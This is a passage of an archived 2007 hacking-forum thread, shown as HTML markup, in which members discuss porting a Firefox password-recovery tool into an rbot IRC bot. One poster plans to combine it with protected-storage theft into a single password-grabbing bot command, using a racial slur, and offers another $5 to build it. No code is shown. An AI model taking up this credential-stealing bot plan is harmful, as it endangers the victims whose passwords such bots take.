+		<img src="./templates/Morpheus/images/spacer.gif" width="150" height="1" border="0" alt="" />
+	</td>
+	<td width="1" class="postborder" rowspan="2"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="100" alt="" /></td>
+	<td width="100%" class="row" align="left" valign="top"><table width="100%" cellspacing="0" cellpadding="0" border="0">
+	<tr>
+		<td width="50%" align="left" style="padding: 3px;"><span class="postdate"><a href="viewtopic.php?p=71749#71749"><img src="templates/Morpheus/images/blue/icon_minipost.gif" width="12" height="9" alt="Post" title="Post" border="0" /></a> Posted: Sun Apr 29, 2007 7:06 pm</span></td>
+		<td width="50%"></td>
+		<td width="23" valign="top" class="posttop" align="left"><img src="./templates/Morpheus/images/posttop_left.gif" width="23" height="9" border="0" alt="" /></td>
+		<td class="posttop" nowrap="nowrap" valign="top"><a href="posting.php?mode=quote&amp;p=71749"><img src="templates/Morpheus/images/lang_english/blue/icon_quote.gif" alt="Reply with quote" title="Reply with quote" border="0" /></a></td>
+	</tr>
+	<tr>
+		<td width="50%" class="postline" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="100" height="1" alt="" /></td>
+		<td colspan="3" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="1" alt="" /></td>
+	</tr>
+	</table>
+	<div style="padding: 4px;"><span class="postbody">Yea that topic can be found here: <a href="./link.php?url=http%3A%2F%2Fwww.ryan1918.com%2Fviewtopic.php%3Ft%3D5386" target="_blank">http://www.ryan1918.com/viewtopic.php?t=5386</a>
+<br />
+
+<br />
+Found that topic after I finished porting it to rbot myself, so I posted it anyway since its not the same..
+<br />
+
+<br />
+Credits goes to FireMaster project: <a href="./link.php?url=http%3A%2F%2Fsecurityxploded.com%2Ffiremaster.php" target="_blank">http://securityxploded.com/firemaster.php</a></span></div>
+	</td>
+</tr>
+<tr>
+	<td align="left" valign="bottom">
+	<div style="padding: 5px;"><span class="signature"><span class="gensmall"></span></span></div>
+	<table width="100%" height="9" border="0" cellspacing="0" cellpadding="0">
+	<tr>
+		<td class="postbottom" height="9" nowrap="nowrap"><img src="templates/Morpheus/images/lang_english/icon_offline.png" alt="MaddY is offline" title="MaddY is offline" />&nbsp;<a href="profile.php?mode=viewprofile&amp;u=10746"><img src="templates/Morpheus/images/lang_english/icon_profile.gif" alt="View user's profile" title="View user's profile" border="0" /></a><a href="privmsg.php?mode=post&amp;u=10746"><img src="templates/Morpheus/images/lang_english/icon_pm.gif" alt="Send private message" title="Send private message" border="0" /></a></td>
+		<td width="100%" height="9" align="left"><img src="./templates/Morpheus/images/postbottom_right.gif" width="22" height="9" alt="" /></td>
+	</tr>
+	</table></td>
+</tr>
+</table><table width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="right" width="100%" height="15" valign="top"><a href="#top"><img src="./templates/Morpheus/images/ftr_right.gif" width="60" height="10" alt="" /></a></td></tr></table>
+<a name="71927"></a>
+<table width="100%" class="hdr" cellspacing="0" cellpadding="0"><tr><td align="left" width="35"><img src="./templates/Morpheus/images/blue/hdr_left_post.gif" width="35" height="25" alt="" /></td><td width="100%" align="left" nowrap="nowrap"></td><td width="120" align="right"><img src="./templates/Morpheus/images/blue/hdr_right_blue.gif" width="120" height="25" alt="" /></td></tr></table><table border="0" cellpadding="0" cellspacing="0" width="100%" class="post">
+<tr>
+	<td width="150" class="row" align="center" valign="top" style="padding: 2px;" rowspan="2">
+		<div style="padding: 3px;"><span class="name">SF</span><br /></div>
+		<div style="padding: 2px;"><span class="postdetails">member</span><br /></div>
+		<img src="images/rank/rank2.gif" alt="member" title="member" border="0" /><br />
+		<img width="85" src="http://img87.imageshack.us/img87/9581/av5402vf8.gif" alt="" border="0" />
+		<br />
+Age: 16
+<br />
+		
+		<table width="100%" cellspacing="5" cellpadding="0">
+			<tr><td align="left"><span class="postdetails">Joined: 10 Apr 2007</span></td></tr>
+			<tr><td align="left"><span class="postdetails">Posts: 208</span></td></tr>
+			<tr><td align="left"><span class="postdetails"></span></td></tr>
+		</table>
+		<img src="./templates/Morpheus/images/spacer.gif" width="150" height="1" border="0" alt="" />
+	</td>
+	<td width="1" class="postborder" rowspan="2"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="100" alt="" /></td>
+	<td width="100%" class="row" align="left" valign="top"><table width="100%" cellspacing="0" cellpadding="0" border="0">
+	<tr>
+		<td width="50%" align="left" style="padding: 3px;"><span class="postdate"><a href="viewtopic.php?p=71927#71927"><img src="templates/Morpheus/images/blue/icon_minipost.gif" width="12" height="9" alt="Post" title="Post" border="0" /></a> Posted: Mon Apr 30, 2007 7:46 pm</span></td>
+		<td width="50%"></td>
+		<td width="23" valign="top" class="posttop" align="left"><img src="./templates/Morpheus/images/posttop_left.gif" width="23" height="9" border="0" alt="" /></td>
+		<td class="posttop" nowrap="nowrap" valign="top"><a href="posting.php?mode=quote&amp;p=71927"><img src="templates/Morpheus/images/lang_english/blue/icon_quote.gif" alt="Reply with quote" title="Reply with quote" border="0" /></a></td>
+	</tr>
+	<tr>
+		<td width="50%" class="postline" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="100" height="1" alt="" /></td>
+		<td colspan="3" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="1" alt="" /></td>
+	</tr>
+	</table>
+	<div style="padding: 4px;"><span class="postbody">im going to put this on a bot and add pstore :) make it all 1 cmd .givemeyourpasswordnigger!</span></div>
+	</td>
+</tr>
+<tr>
+	<td align="left" valign="bottom">
+	<div style="padding: 5px;"><span class="signature"><span class="gensmall"></span><br />_________________<br /><a href="./link.php?url=http%3A%2F%2Fstealthwarez.com" target="_blank"><img src="http://img237.imageshack.us/img237/332/sfju0.jpg" border="0" /></a></span></div>
+	<table width="100%" height="9" border="0" cellspacing="0" cellpadding="0">
+	<tr>
+		<td class="postbottom" height="9" nowrap="nowrap"><a href="viewonline.php"><img src="templates/Morpheus/images/lang_english/icon_online.png" alt="SF is online now" title="SF is online now" /></a>&nbsp;<a href="profile.php?mode=viewprofile&amp;u=10903"><img src="templates/Morpheus/images/lang_english/icon_profile.gif" alt="View user's profile" title="View user's profile" border="0" /></a><a href="privmsg.php?mode=post&amp;u=10903"><img src="templates/Morpheus/images/lang_english/icon_pm.gif" alt="Send private message" title="Send private message" border="0" /></a><a href="http://stealthwarez.com" target="_userwww"><img src="templates/Morpheus/images/lang_english/icon_www.gif" alt="Visit poster's website" title="Visit poster's website" border="0" /></a></td>
+		<td width="100%" height="9" align="left"><img src="./templates/Morpheus/images/postbottom_right.gif" width="22" height="9" alt="" /></td>
+	</tr>
+	</table></td>
+</tr>
+</table><table width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="right" width="100%" height="15" valign="top"><a href="#top"><img src="./templates/Morpheus/images/ftr_right.gif" width="60" height="10" alt="" /></a></td></tr></table>
+<a name="72874"></a>
+<table width="100%" class="hdr" cellspacing="0" cellpadding="0"><tr><td align="left" width="35"><img src="./templates/Morpheus/images/blue/hdr_left_post.gif" width="35" height="25" alt="" /></td><td width="100%" align="left" nowrap="nowrap"></td><td width="120" align="right"><img src="./templates/Morpheus/images/blue/hdr_right_blue.gif" width="120" height="25" alt="" /></td></tr></table><table border="0" cellpadding="0" cellspacing="0" width="100%" class="post">
+<tr>
+	<td width="150" class="row" align="center" valign="top" style="padding: 2px;" rowspan="2">
+		<div style="padding: 3px;"><span class="name">Sculay</span><br /></div>
+		<div style="padding: 2px;"><span class="postdetails">elite poster</span><br /></div>
+		<img src="images/rank/rank4.gif" alt="elite poster" title="elite poster" border="0" /><br />
+		
+		<br />
+Age: 18
+<br />
+		
+		<table width="100%" cellspacing="5" cellpadding="0">
+			<tr><td align="left"><span class="postdetails">Joined: 07 Sep 2006</span></td></tr>
+			<tr><td align="left"><span class="postdetails">Posts: 627</span></td></tr>
+			<tr><td align="left"><span class="postdetails">Location: East London</span></td></tr>
+		</table>
+		<img src="./templates/Morpheus/images/spacer.gif" width="150" height="1" border="0" alt="" />
+	</td>
+	<td width="1" class="postborder" rowspan="2"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="100" alt="" /></td>
+	<td width="100%" class="row" align="left" valign="top"><table width="100%" cellspacing="0" cellpadding="0" border="0">
+	<tr>
+		<td width="50%" align="left" style="padding: 3px;"><span class="postdate"><a href="viewtopic.php?p=72874#72874"><img src="templates/Morpheus/images/blue/icon_minipost.gif" width="12" height="9" alt="Post" title="Post" border="0" /></a> Posted: Sun May 06, 2007 9:10 am</span></td>
+		<td width="50%"></td>
+		<td width="23" valign="top" class="posttop" align="left"><img src="./templates/Morpheus/images/posttop_left.gif" width="23" height="9" border="0" alt="" /></td>
+		<td class="posttop" nowrap="nowrap" valign="top"><a href="posting.php?mode=quote&amp;p=72874"><img src="templates/Morpheus/images/lang_english/blue/icon_quote.gif" alt="Reply with quote" title="Reply with quote" border="0" /></a></td>
+	</tr>
+	<tr>
+		<td width="50%" class="postline" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="100" height="1" alt="" /></td>
+		<td colspan="3" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="1" alt="" /></td>
+	</tr>
+	</table>
+	<div style="padding: 4px;"><span class="postbody">yeah its been posted before but not with much detail cheers maddy 
+<br />
+lol @ SF</span></div>
+	</td>
+</tr>
+<tr>
+	<td align="left" valign="bottom">
+	<div style="padding: 5px;"><span class="signature"><span class="gensmall"></span><br />_________________<br />ePc &amp; HcK 4ever :)
+<br />
+<span style="text-decoration: underline">Good Business</span>
+<br />
+Succesfull: ShellCapture1, vendor, -ExeL-
+<br />
+Pending: Dej
+<br />
+Failed &amp; wont do business again : Beepo</span></div>
+	<table width="100%" height="9" border="0" cellspacing="0" cellpadding="0">
+	<tr>
+		<td class="postbottom" height="9" nowrap="nowrap"><img src="templates/Morpheus/images/lang_english/icon_offline.png" alt="Sculay is offline" title="Sculay is offline" />&nbsp;<a href="profile.php?mode=viewprofile&amp;u=3053"><img src="templates/Morpheus/images/lang_english/icon_profile.gif" alt="View user's profile" title="View user's profile" border="0" /></a><a href="privmsg.php?mode=post&amp;u=3053"><img src="templates/Morpheus/images/lang_english/icon_pm.gif" alt="Send private message" title="Send private message" border="0" /></a><a href="mailto:sculay@gmail.com"><img src="templates/Morpheus/images/lang_english/icon_email.gif" alt="Send e-mail" title="Send e-mail" border="0" /></a><a href="profile.php?mode=viewprofile&amp;u=3053"><img src="templates/Morpheus/images/lang_english/icon_msn.gif" alt="MSN Messenger" title="MSN Messenger" border="0" /></a></td>
+		<td width="100%" height="9" align="left"><img src="./templates/Morpheus/images/postbottom_right.gif" width="22" height="9" alt="" /></td>
+	</tr>
+	</table></td>
+</tr>
+</table><table width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="right" width="100%" height="15" valign="top"><a href="#top"><img src="./templates/Morpheus/images/ftr_right.gif" width="60" height="10" alt="" /></a></td></tr></table>
+<a name="73017"></a>
+<table width="100%" class="hdr" cellspacing="0" cellpadding="0"><tr><td align="left" width="35"><img src="./templates/Morpheus/images/blue/hdr_left_post.gif" width="35" height="25" alt="" /></td><td width="100%" align="left" nowrap="nowrap"></td><td width="120" align="right"><img src="./templates/Morpheus/images/blue/hdr_right_blue.gif" width="120" height="25" alt="" /></td></tr></table><table border="0" cellpadding="0" cellspacing="0" width="100%" class="post">
+<tr>
+	<td width="150" class="row" align="center" valign="top" style="padding: 2px;" rowspan="2">
+		<div style="padding: 3px;"><span class="name">SF</span><br /></div>
+		<div style="padding: 2px;"><span class="postdetails">member</span><br /></div>
+		<img src="images/rank/rank2.gif" alt="member" title="member" border="0" /><br />
+		<img width="85" src="http://img87.imageshack.us/img87/9581/av5402vf8.gif" alt="" border="0" />
+		<br />
+Age: 16
+<br />
+		
+		<table width="100%" cellspacing="5" cellpadding="0">
+			<tr><td align="left"><span class="postdetails">Joined: 10 Apr 2007</span></td></tr>
+			<tr><td align="left"><span class="postdetails">Posts: 208</span></td></tr>
+			<tr><td align="left"><span class="postdetails"></span></td></tr>
+		</table>
+		<img src="./templates/Morpheus/images/spacer.gif" width="150" height="1" border="0" alt="" />
+	</td>
+	<td width="1" class="postborder" rowspan="2"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="100" alt="" /></td>
+	<td width="100%" class="row" align="left" valign="top"><table width="100%" cellspacing="0" cellpadding="0" border="0">
+	<tr>
+		<td width="50%" align="left" style="padding: 3px;"><span class="postdate"><a href="viewtopic.php?p=73017#73017"><img src="templates/Morpheus/images/blue/icon_minipost.gif" width="12" height="9" alt="Post" title="Post" border="0" /></a> Posted: Sun May 06, 2007 11:02 pm</span></td>
+		<td width="50%"></td>
+		<td width="23" valign="top" class="posttop" align="left"><img src="./templates/Morpheus/images/posttop_left.gif" width="23" height="9" border="0" alt="" /></td>
+		<td class="posttop" nowrap="nowrap" valign="top"><a href="posting.php?mode=quote&amp;p=73017"><img src="templates/Morpheus/images/lang_english/blue/icon_quote.gif" alt="Reply with quote" title="Reply with quote" border="0" /></a></td>
+	</tr>
+	<tr>
+		<td width="50%" class="postline" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="100" height="1" alt="" /></td>
+		<td colspan="3" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="1" alt="" /></td>
+	</tr>
+	</table>
+	<div style="padding: 4px;"><span class="postbody">sculay wanna put it on a rbot for me i got confused lol</span></div>
+	</td>
+</tr>
+<tr>
+	<td align="left" valign="bottom">
+	<div style="padding: 5px;"><span class="signature"><span class="gensmall"></span><br />_________________<br /><a href="./link.php?url=http%3A%2F%2Fstealthwarez.com" target="_blank"><img src="http://img237.imageshack.us/img237/332/sfju0.jpg" border="0" /></a></span></div>
+	<table width="100%" height="9" border="0" cellspacing="0" cellpadding="0">
+	<tr>
+		<td class="postbottom" height="9" nowrap="nowrap"><a href="viewonline.php"><img src="templates/Morpheus/images/lang_english/icon_online.png" alt="SF is online now" title="SF is online now" /></a>&nbsp;<a href="profile.php?mode=viewprofile&amp;u=10903"><img src="templates/Morpheus/images/lang_english/icon_profile.gif" alt="View user's profile" title="View user's profile" border="0" /></a><a href="privmsg.php?mode=post&amp;u=10903"><img src="templates/Morpheus/images/lang_english/icon_pm.gif" alt="Send private message" title="Send private message" border="0" /></a><a href="http://stealthwarez.com" target="_userwww"><img src="templates/Morpheus/images/lang_english/icon_www.gif" alt="Visit poster's website" title="Visit poster's website" border="0" /></a></td>
+		<td width="100%" height="9" align="left"><img src="./templates/Morpheus/images/postbottom_right.gif" width="22" height="9" alt="" /></td>
+	</tr>
+	</table></td>
+</tr>
+</table><table width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="right" width="100%" height="15" valign="top"><a href="#top"><img src="./templates/Morpheus/images/ftr_right.gif" width="60" height="10" alt="" /></a></td></tr></table>
+<a name="73049"></a>
+<table width="100%" class="hdr" cellspacing="0" cellpadding="0"><tr><td align="left" width="35"><img src="./templates/Morpheus/images/blue/hdr_left_post.gif" width="35" height="25" alt="" /></td><td width="100%" align="left" nowrap="nowrap"></td><td width="120" align="right"><img src="./templates/Morpheus/images/blue/hdr_right_blue.gif" width="120" height="25" alt="" /></td></tr></table><table border="0" cellpadding="0" cellspacing="0" width="100%" class="post">
+<tr>
+	<td width="150" class="row" align="center" valign="top" style="padding: 2px;" rowspan="2">
+		<div style="padding: 3px;"><span class="name">Sculay</span><br /></div>
+		<div style="padding: 2px;"><span class="postdetails">elite poster</span><br /></div>
+		<img src="images/rank/rank4.gif" alt="elite poster" title="elite poster" border="0" /><br />
+		
+		<br />
+Age: 18
+<br />
+		
+		<table width="100%" cellspacing="5" cellpadding="0">
+			<tr><td align="left"><span class="postdetails">Joined: 07 Sep 2006</span></td></tr>
+			<tr><td align="left"><span class="postdetails">Posts: 627</span></td></tr>
+			<tr><td align="left"><span class="postdetails">Location: East London</span></td></tr>
+		</table>
+		<img src="./templates/Morpheus/images/spacer.gif" width="150" height="1" border="0" alt="" />
+	</td>
+	<td width="1" class="postborder" rowspan="2"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="100" alt="" /></td>
+	<td width="100%" class="row" align="left" valign="top"><table width="100%" cellspacing="0" cellpadding="0" border="0">
+	<tr>
+		<td width="50%" align="left" style="padding: 3px;"><span class="postdate"><a href="viewtopic.php?p=73049#73049"><img src="templates/Morpheus/images/blue/icon_minipost.gif" width="12" height="9" alt="Post" title="Post" border="0" /></a> Posted: Mon May 07, 2007 1:30 am</span></td>
+		<td width="50%"></td>
+		<td width="23" valign="top" class="posttop" align="left"><img src="./templates/Morpheus/images/posttop_left.gif" width="23" height="9" border="0" alt="" /></td>
+		<td class="posttop" nowrap="nowrap" valign="top"><a href="posting.php?mode=quote&amp;p=73049"><img src="templates/Morpheus/images/lang_english/blue/icon_quote.gif" alt="Reply with quote" title="Reply with quote" border="0" /></a></td>
+	</tr>
+	<tr>
+		<td width="50%" class="postline" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="100" height="1" alt="" /></td>
+		<td colspan="3" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="1" alt="" /></td>
+	</tr>
+	</table>
+	<div style="padding: 4px;"><span class="postbody">only if theres $ in it for me :)</span></div>
+	</td>
+</tr>
+<tr>
+	<td align="left" valign="bottom">
+	<div style="padding: 5px;"><span class="signature"><span class="gensmall"></span><br />_________________<br />ePc &amp; HcK 4ever :)
+<br />
+<span style="text-decoration: underline">Good Business</span>
+<br />
+Succesfull: ShellCapture1, vendor, -ExeL-
+<br />
+Pending: Dej
+<br />
+Failed &amp; wont do business again : Beepo</span></div>
+	<table width="100%" height="9" border="0" cellspacing="0" cellpadding="0">
+	<tr>
+		<td class="postbottom" height="9" nowrap="nowrap"><img src="templates/Morpheus/images/lang_english/icon_offline.png" alt="Sculay is offline" title="Sculay is offline" />&nbsp;<a href="profile.php?mode=viewprofile&amp;u=3053"><img src="templates/Morpheus/images/lang_english/icon_profile.gif" alt="View user's profile" title="View user's profile" border="0" /></a><a href="privmsg.php?mode=post&amp;u=3053"><img src="templates/Morpheus/images/lang_english/icon_pm.gif" alt="Send private message" title="Send private message" border="0" /></a><a href="mailto:sculay@gmail.com"><img src="templates/Morpheus/images/lang_english/icon_email.gif" alt="Send e-mail" title="Send e-mail" border="0" /></a><a href="profile.php?mode=viewprofile&amp;u=3053"><img src="templates/Morpheus/images/lang_english/icon_msn.gif" alt="MSN Messenger" title="MSN Messenger" border="0" /></a></td>
+		<td width="100%" height="9" align="left"><img src="./templates/Morpheus/images/postbottom_right.gif" width="22" height="9" alt="" /></td>
+	</tr>
+	</table></td>
+</tr>
+</table><table width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="right" width="100%" height="15" valign="top"><a href="#top"><img src="./templates/Morpheus/images/ftr_right.gif" width="60" height="10" alt="" /></a></td></tr></table>
+<a name="73112"></a>
+<table width="100%" class="hdr" cellspacing="0" cellpadding="0"><tr><td align="left" width="35"><img src="./templates/Morpheus/images/blue/hdr_left_post.gif" width="35" height="25" alt="" /></td><td width="100%" align="left" nowrap="nowrap"></td><td width="120" align="right"><img src="./templates/Morpheus/images/blue/hdr_right_blue.gif" width="120" height="25" alt="" /></td></tr></table><table border="0" cellpadding="0" cellspacing="0" width="100%" class="post">
+<tr>
+	<td width="150" class="row" align="center" valign="top" style="padding: 2px;" rowspan="2">
+		<div style="padding: 3px;"><span class="name">iNs</span><br /></div>
+		<div style="padding: 2px;"><span class="postdetails">poster</span><br /></div>
+		<img src="images/rank/rank1.gif" alt="poster" title="poster" border="0" /><br />
+		<img width="85" src="http://img119.imageshack.us/img119/173/insau8.gif" alt="" border="0" />
+		<br />
+Age: 38
+<br />
+		
+		<table width="100%" cellspacing="5" cellpadding="0">
+			<tr><td align="left"><span class="postdetails">Joined: 01 May 2007</span></td></tr>
+			<tr><td align="left"><span class="postdetails">Posts: 46</span></td></tr>
+			<tr><td align="left"><span class="postdetails"></span></td></tr>
+		</table>
+		<img src="./templates/Morpheus/images/spacer.gif" width="150" height="1" border="0" alt="" />
+	</td>
+	<td width="1" class="postborder" rowspan="2"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="100" alt="" /></td>
+	<td width="100%" class="row" align="left" valign="top"><table width="100%" cellspacing="0" cellpadding="0" border="0">
+	<tr>
+		<td width="50%" align="left" style="padding: 3px;"><span class="postdate"><a href="viewtopic.php?p=73112#73112"><img src="templates/Morpheus/images/blue/icon_minipost.gif" width="12" height="9" alt="Post" title="Post" border="0" /></a> Posted: Mon May 07, 2007 6:13 am</span></td>
+		<td width="50%"></td>
+		<td width="23" valign="top" class="posttop" align="left"><img src="./templates/Morpheus/images/posttop_left.gif" width="23" height="9" border="0" alt="" /></td>
+		<td class="posttop" nowrap="nowrap" valign="top"><a href="posting.php?mode=quote&amp;p=73112"><img src="templates/Morpheus/images/lang_english/blue/icon_quote.gif" alt="Reply with quote" title="Reply with quote" border="0" /></a></td>
+	</tr>
+	<tr>
+		<td width="50%" class="postline" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="100" height="1" alt="" /></td>
+		<td colspan="3" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="1" alt="" /></td>
+	</tr>
+	</table>
+	<div style="padding: 4px;"><span class="postbody">Nice code tHx MaddY</span></div>
+	</td>
+</tr>
+<tr>
+	<td align="left" valign="bottom">
+	<div style="padding: 5px;"><span class="signature"><span class="gensmall"></span><br />_________________<br />...</span></div>
+	<table width="100%" height="9" border="0" cellspacing="0" cellpadding="0">
+	<tr>
+		<td class="postbottom" height="9" nowrap="nowrap"><a href="viewonline.php"><img src="templates/Morpheus/images/lang_english/icon_online.png" alt="iNs is online now" title="iNs is online now" /></a>&nbsp;<a href="profile.php?mode=viewprofile&amp;u=12141"><img src="templates/Morpheus/images/lang_english/icon_profile.gif" alt="View user's profile" title="View user's profile" border="0" /></a><a href="privmsg.php?mode=post&amp;u=12141"><img src="templates/Morpheus/images/lang_english/icon_pm.gif" alt="Send private message" title="Send private message" border="0" /></a></td>
+		<td width="100%" height="9" align="left"><img src="./templates/Morpheus/images/postbottom_right.gif" width="22" height="9" alt="" /></td>
+	</tr>
+	</table></td>
+</tr>
+</table><table width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="right" width="100%" height="15" valign="top"><a href="#top"><img src="./templates/Morpheus/images/ftr_right.gif" width="60" height="10" alt="" /></a></td></tr></table>
+<a name="73238"></a>
+<table width="100%" class="hdr" cellspacing="0" cellpadding="0"><tr><td align="left" width="35"><img src="./templates/Morpheus/images/blue/hdr_left_post.gif" width="35" height="25" alt="" /></td><td width="100%" align="left" nowrap="nowrap"></td><td width="120" align="right"><img src="./templates/Morpheus/images/blue/hdr_right_blue.gif" width="120" height="25" alt="" /></td></tr></table><table border="0" cellpadding="0" cellspacing="0" width="100%" class="post">
+<tr>
+	<td width="150" class="row" align="center" valign="top" style="padding: 2px;" rowspan="2">
+		<div style="padding: 3px;"><span class="name">SF</span><br /></div>
+		<div style="padding: 2px;"><span class="postdetails">member</span><br /></div>
+		<img src="images/rank/rank2.gif" alt="member" title="member" border="0" /><br />
+		<img width="85" src="http://img87.imageshack.us/img87/9581/av5402vf8.gif" alt="" border="0" />
+		<br />
+Age: 16
+<br />
+		
+		<table width="100%" cellspacing="5" cellpadding="0">
+			<tr><td align="left"><span class="postdetails">Joined: 10 Apr 2007</span></td></tr>
+			<tr><td align="left"><span class="postdetails">Posts: 208</span></td></tr>
+			<tr><td align="left"><span class="postdetails"></span></td></tr>
+		</table>
+		<img src="./templates/Morpheus/images/spacer.gif" width="150" height="1" border="0" alt="" />
+	</td>
+	<td width="1" class="postborder" rowspan="2"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="100" alt="" /></td>
+	<td width="100%" class="row" align="left" valign="top"><table width="100%" cellspacing="0" cellpadding="0" border="0">
+	<tr>
+		<td width="50%" align="left" style="padding: 3px;"><span class="postdate"><a href="viewtopic.php?p=73238#73238"><img src="templates/Morpheus/images/blue/icon_minipost.gif" width="12" height="9" alt="Post" title="Post" border="0" /></a> Posted: Mon May 07, 2007 7:13 pm</span></td>
+		<td width="50%"></td>
+		<td width="23" valign="top" class="posttop" align="left"><img src="./templates/Morpheus/images/posttop_left.gif" width="23" height="9" border="0" alt="" /></td>
+		<td class="posttop" nowrap="nowrap" valign="top"><a href="posting.php?mode=quote&amp;p=73238"><img src="templates/Morpheus/images/lang_english/blue/icon_quote.gif" alt="Reply with quote" title="Reply with quote" border="0" /></a></td>
+	</tr>
+	<tr>
+		<td width="50%" class="postline" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="100" height="1" alt="" /></td>
+		<td colspan="3" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="1" alt="" /></td>
+	</tr>
+	</table>
+	<div style="padding: 4px;"><span class="postbody">$5</span></div>
+	</td>
+</tr>
+<tr>
+	<td align="left" valign="bottom">
+	<div style="padding: 5px;"><span class="signature"><span class="gensmall"></span><br />_________________<br /><a href="./link.php?url=http%3A%2F%2Fstealthwarez.com" target="_blank"><img src="http://img237.imageshack.us/img237/332/sfju0.jpg" border="0" /></a></span></div>
+	<table width="100%" height="9" border="0" cellspacing="0" cellpadding="0">
+	<tr>
+		<td class="postbottom" height="9" nowrap="nowrap"><a href="viewonline.php"><img src="templates/Morpheus/images/lang_english/icon_online.png" alt="SF is online now" title="SF is online now" /></a>&nbsp;<a href="profile.php?mode=viewprofile&amp;u=10903"><img src="templates/Morpheus/images/lang_english/icon_profile.gif" alt="View user's profile" title="View user's profile" border="0" /></a><a href="privmsg.php?mode=post&amp;u=10903"><img src="templates/Morpheus/images/lang_english/icon_pm.gif" alt="Send private message" title="Send private message" border="0" /></a><a href="http://stealthwarez.com" target="_userwww"><img src="templates/Morpheus/images/lang_english/icon_www.gif" alt="Visit poster's website" title="Visit poster's website" border="0" /></a></td>
+		<td width="100%" height="9" align="left"><img src="./templates/Morpheus/images/postbottom_right.gif" width="22" height="9" alt="" /></td>
+	</tr>
+	</table></td>
+</tr>
+</table><table width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="right" width="100%" height="15" valign="top"><a href="#top"><img src="./templates/Morpheus/images/ftr_right.gif" width="60" height="10" alt="" /></a></td></tr></table>
+<a name="73273"></a>
+<table width="100%" class="hdr" cellspacing="0" cellpadding="0"><tr><td align="left" width="35"><img src="./templates/Morpheus/images/blue/hdr_left_post.gif" width="35" height="25" alt="" /></td><td width="100%" align="left" nowrap="nowrap"></td><td width="120" align="right"><img src="./templates/Morpheus/images/blue/hdr_right_blue.gif" width="120" height="25" alt="" /></td></tr></table><table border="0" cellpadding="0" cellspacing="0" width="100%" class="post">
+<tr>
+	<td width="150" class="row" align="center" valign="top" style="padding: 2px;" rowspan="2">
+		<div style="padding: 3px;"><span class="name">phiber</span><br /></div>
+		<div style="padding: 2px;"><span class="postdetails">member</span><br /></div>
+		<img src="images/rank/rank2.gif" alt="member" title="member" border="0" /><br />
+		<img width="85" src="http://www.tshirthell.com/shirts/products/a603/a603_thumb.jpg" alt="" border="0" />
+		<br />
+Age: 19
+<br />
+		
+		<table width="100%" cellspacing="5" cellpadding="0">
+			<tr><td align="left"><span class="postdetails">Joined: 05 Mar 2007</span></td></tr>
+			<tr><td align="left"><span class="postdetails">Posts: 202</span></td></tr>
+			<tr><td align="left"><span class="postdetails"></span></td></tr>
+		</table>
+		<img src="./templates/Morpheus/images/spacer.gif" width="150" height="1" border="0" alt="" />
+	</td>
+	<td width="1" class="postborder" rowspan="2"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="100" alt="" /></td>
+	<td width="100%" class="row" align="left" valign="top"><table width="100%" cellspacing="0" cellpadding="0" border="0">
+	<tr>
+		<td width="50%" align="left" style="padding: 3px;"><span class="postdate"><a href="viewtopic.php?p=73273#73273"><img src="templates/Morpheus/images/blue/icon_minipost.gif" width="12" height="9" alt="Post" title="Post" border="0" /></a> Posted: Mon May 07, 2007 11:07 pm</span></td>
+		<td width="50%"></td>
+		<td width="23" valign="top" class="posttop" align="left"><img src="./templates/Morpheus/images/posttop_left.gif" width="23" height="9" border="0" alt="" /></td>
+		<td class="posttop" nowrap="nowrap" valign="top"><a href="posting.php?mode=quote&amp;p=73273"><img src="templates/Morpheus/images/lang_english/blue/icon_quote.gif" alt="Reply with quote" title="Reply with quote" border="0" /></a></td>
+	</tr>
+	<tr>
+		<td width="50%" class="postline" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="100" height="1" alt="" /></td>
+		<td colspan="3" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="1" alt="" /></td>
+	</tr>
+	</table>
+	<div style="padding: 4px;"><span class="postbody">Sculay take it, take it, we could use the money lol :D</span></div>
+	</td>
+</tr>
+<tr>
+	<td align="left" valign="bottom">
+	<div style="padding: 5px;"><span class="signature"><span class="gensmall"><br /><br />Last edited by phiber on Mon May 07, 2007 11:08 pm; edited 1 time in total</span><br />_________________<br />ePc &amp; HcK 4ever :)</span></div>
+	<table width="100%" height="9" border="0" cellspacing="0" cellpadding="0">
+	<tr>
+		<td class="postbottom" height="9" nowrap="nowrap"><a href="viewonline.php"><img src="templates/Morpheus/images/lang_english/icon_online.png" alt="phiber is online now" title="phiber is online now" /></a>&nbsp;<a href="profile.php?mode=viewprofile&amp;u=9405"><img src="templates/Morpheus/images/lang_english/icon_profile.gif" alt="View user's profile" title="View user's profile" border="0" /></a><a href="privmsg.php?mode=post&amp;u=9405"><img src="templates/Morpheus/images/lang_english/icon_pm.gif" alt="Send private message" title="Send private message" border="0" /></a></td>
+		<td width="100%" height="9" align="left"><img src="./templates/Morpheus/images/postbottom_right.gif" width="22" height="9" alt="" /></td>
+	</tr>
+	</table></td>
+</tr>
